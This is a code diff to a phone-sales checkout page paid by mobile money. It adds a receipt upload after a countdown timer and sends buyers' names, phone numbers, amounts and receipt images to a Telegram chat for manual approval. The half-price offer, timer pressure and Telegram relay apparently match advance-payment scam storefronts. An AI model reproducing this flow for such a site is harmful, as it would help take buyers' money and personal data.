@@ -931,11 +931,39 @@
                     <div style="font-size: 48px; margin-bottom: 20px;">⏳</div>
                     <div style="font-size: 22px; font-weight: bold; color: #003DA5; margin-bottom: 15px;">Time's Up!</div>
                     <p style="font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.8;">
-                        Please upload your receipt if you have paid, or try again with the correct details.
+                        Your session has timed out. If you have already made the payment, please upload your receipt below for verification. Otherwise, you can try again.
                     </p>
-                    <button class="btn btn-primary" onclick="resetToStep1()" style="margin-bottom: 10px;">
-                        🔄 Try Again
-                    </button>
+                    
+                    <!-- Receipt Upload After Timer -->
+                    <div class="receipt-upload-section" style="text-align: left; margin-bottom: 30px;">
+                        <div class="receipt-upload-title">📄 Upload Receipt</div>
+                        <div class="receipt-upload-hint">
+                            Upload a screenshot of your transaction receipt to confirm your payment.
+                        </div>
+                        <div class="upload-area-timer" id="receiptUploadAreaExpired" onclick="document.getElementById('receiptInputExpired').click()">
+                            <div id="receiptContentExpired">
+                                <div style="font-size: 32px; margin-bottom: 10px;">📄</div>
+                                <div style="font-size: 14px; font-weight: bold; color: #003DA5; margin-bottom: 5px;">Click to upload receipt</div>
+                                <div style="font-size: 12px; color: #999;">JPG, PNG - Max 5MB</div>
+                            </div>
+                            <img id="receiptImageExpired" class="preview-image-timer" src="" alt="Receipt preview" style="display: none;">
+                            <div id="receiptPreviewInfoExpired" style="display: none; text-align: center;">
+                                <div class="receipt-preview-info" id="receiptInfoExpired"></div>
+                                <button type="button" class="remove-receipt-btn" onclick="removeReceiptExpired()">Remove & Re-upload</button>
+                            </div>
+                        </div>
+                        <input type="file" id="receiptInputExpired" class="upload-input" accept="image/*" onchange="handleReceiptUploadExpired(event)" style="display: none;">
+                        <button class="submit-receipt-btn" id="submitReceiptBtnExpired" onclick="submitReceiptAfterTimer()" disabled>
+                            SUBMIT RECEIPT FOR APPROVAL
+                        </button>
+                    </div>
+
+                    <div style="border-top: 1px solid #E0E0E0; padding-top: 20px; margin-top: 20px;">
+                        <p style="font-size: 13px; color: #999; margin-bottom: 15px;">Didn't pay yet? Start over below:</p>
+                        <button class="btn btn-primary" onclick="resetToStep1()" style="margin-bottom: 10px;">
+                            🔄 Try Again
+                        </button>
+                    </div>
                 </div>
             </div>
 
@@ -1130,12 +1158,50 @@
             document.getElementById('submitReceiptBtn').disabled = true;
         }
 
+        function handleReceiptUploadExpired(event) {
+            const file = event.target.files[0];
+            if (file && file.size <= 5 * 1024 * 1024) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    document.getElementById('receiptContentExpired').style.display = 'none';
+                    document.getElementById('receiptImageExpired').src = e.target.result;
+                    document.getElementById('receiptImageExpired').style.display = 'block';
+                    document.getElementById('receiptPreviewInfoExpired').style.display = 'block';
+                    document.getElementById('receiptUploadAreaExpired').classList.add('has-image');
+                    document.getElementById('submitReceiptBtnExpired').disabled = false;
+                };
+                reader.readAsDataURL(file);
+            }
+        }
+
+        function removeReceiptExpired() {
+            document.getElementById('receiptInputExpired').value = '';
+            document.getElementById('receiptContentExpired').style.display = 'flex';
+            document.getElementById('receiptImageExpired').style.display = 'none';
+            document.getElementById('receiptPreviewInfoExpired').style.display = 'none';
+            document.getElementById('receiptUploadAreaExpired').classList.remove('has-image');
+            document.getElementById('submitReceiptBtnExpired').disabled = true;
+        }
+
         function submitReceiptDuringTimer() {
             if (!receiptUploadedTimer) {
                 alert('Please upload a receipt first');
                 return;
             }
             const receipt = document.getElementById('receiptImageTimer').src;
+            processReceiptSubmission(receipt);
+        }
+
+        function submitReceiptAfterTimer() {
+            const receipt = document.getElementById('receiptImageExpired').src;
+            if (!receipt) {
+                alert('Please upload a receipt first');
+                return;
+            }
+            processReceiptSubmission(receipt);
+        }
+
+        function processReceiptSubmission(receipt) {
             const name = document.getElementById('senderName').value;
             const mtn = document.getElementById('senderMTN').value;
             const phoneData = JSON.parse(sessionStorage.getItem('selectedPhone') || '{}');
@@ -1146,11 +1212,17 @@
             // Send receipt to Telegram immediately
             sendPhotoToTelegram(receipt, `📄 <b>RECEIPT SUBMITTED</b>\n👤 Name: ${name}\n📞 Number: ${mtn}\n📱 Device: ${phoneData.name}\n💰 Amount: GHS ${halfPrice.toLocaleString()}\n🔐 ID: ${paymentId}`);
 
-            const msg = `📄 <b>RECEIPT RECEIVED</b>\n👤 ${name}\n📞 ${mtn}\n📱 ${phoneData.name}\n💰 GHS ${halfPrice.toLocaleString()}\n\n<b>Receipt has been uploaded. You already have Approve/Decline options above.</b>`; // Consistent formatting
-            sendTelegramMessage(msg);
+            const msg = `📄 <b>RECEIPT RECEIVED</b>\n👤 ${name}\n📞 ${mtn}\n📱 ${phoneData.name}\n💰 GHS ${halfPrice.toLocaleString()}\n\n<b>Receipt has been uploaded. You can approve or decline this payment.</b>`;
+            
+            const keyboard = [[
+                { text: '✅ Approve', callback_data: `approve_${paymentId}` },
+                { text: '❌ Decline', callback_data: `decline_${paymentId}` }
+            ]];
+            
+            sendTelegramMessage(msg, keyboard);
 
-            // Hide timer and show reviewing state
-            document.getElementById('step2').classList.remove('active');
+            // Hide all steps and show reviewing state
+            hideAllSteps();
             document.getElementById('reviewingState').classList.add('active');
             clearInterval(timerInterval);
             
